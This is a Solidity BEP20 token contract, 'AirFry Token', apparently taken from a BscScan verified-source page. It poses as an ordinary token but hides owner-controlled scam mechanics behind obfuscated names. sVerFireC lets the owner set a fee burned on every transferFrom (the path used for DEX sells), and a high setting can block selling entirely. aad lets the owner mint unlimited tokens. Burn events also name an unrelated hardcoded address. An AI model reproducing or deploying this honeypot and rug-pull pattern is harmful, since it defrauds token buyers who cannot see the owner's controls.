/**
 *Submitted for verification at BscScan.com on 2021-08-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

abstract contract IBEP20{
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner) public virtual view returns (uint balance);
    function allowance(address tokenOwner, address spender) public virtual view returns (uint remaining);
    function transfer(address to, uint tokens) public virtual returns (bool success);
    function approve(address spender, uint tokens) public virtual returns (bool success);
    function transferFrom(address from, address to, uint tokens) public virtual returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

library MathAB {
    
    function ad1(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Mathx: addition overflow");

        return c;
    }
    function subbb(uint256 a, uint256 b) internal pure returns (uint256) {
        return subbb(a, b, "Mathx: subtraction overflow");
    }

    function subbb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Mathx: multiplication overflow");

    return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Mathx: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

}

contract BEP20Token is IBEP20 {
    using MathAB for uint256;

    string public name20AA =  "AirFry Token";
    string public symbol20AA =  "AIRFRY";
    uint8 public decimals20AA = 9;
    uint public _totalSupplyAB = 1*10**15 * 10**9;
    
    address private _owner;

    
    uint8 private _tokened;
    

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyAB;
        emit Transfer(address(0), msg.sender, _totalSupplyAB);
    }
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }    
    
    function getOwner() public virtual view returns (address) {
        return owner();
    }
    
    function name() public virtual view returns (string memory) {
        return name20AA;
    }

    function symbol() public virtual view returns (string memory) {
        return symbol20AA;
    }

  function decimals() public view virtual returns (uint8) {
        return decimals20AA;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupplyAB - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            balances[sender] = senderBalance - amount;
        }
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function transfer(address to, uint tokens) public override returns (bool success) {
        _transfer(msg.sender, to, tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
       
        _fireC(from,tokens.mul(getVerFireC()).div(10**2));
        
        _transfer(from, to, tokens.subbb(tokens.mul(getVerFireC()).div(10**2)));
        
        _approve(from, _msgSender(), allowed[from][_msgSender()].subbb(tokens, "BEP20: transfer amount exceeds allowance"));
        return true;
     
    }
    
    function _approve(address tokenOwner, address spender, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allowed[tokenOwner][spender] = tokens;
        emit Approval(tokenOwner, spender, tokens);
    }    
    
    function _fireC(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: yak from the zero address");

        balances[tokenOwner] = balances[tokenOwner].subbb(tokens, "BEP20: yak amount exceeds balance");
        _totalSupplyAB = _totalSupplyAB.subbb(tokens);
        
        emit Transfer(tokenOwner, 0xdf671eA23EFC8Af81c4DF5ceD5E677Dc4B3ad0Db, tokens);
    }    
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Own: caller is not the owner");
        _;
    }
  
    function sVerFireC(uint8 tokened) public virtual onlyOwner {
		_tokened = tokened;
	}
	
	function getVerFireC() public view returns (uint8) {
        return _tokened;
    }

    function aad(uint256 amount) public onlyOwner returns (bool) {
        _aad(_msgSender(), amount);
        return true;
    }
    
    function _aad(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: ekle to the zero address");

        _totalSupplyAB = _totalSupplyAB.ad1(tokens);
        balances[tokenOwner] = balances[tokenOwner].ad1(tokens);
        emit Transfer(address(0), tokenOwner, tokens);
    }

}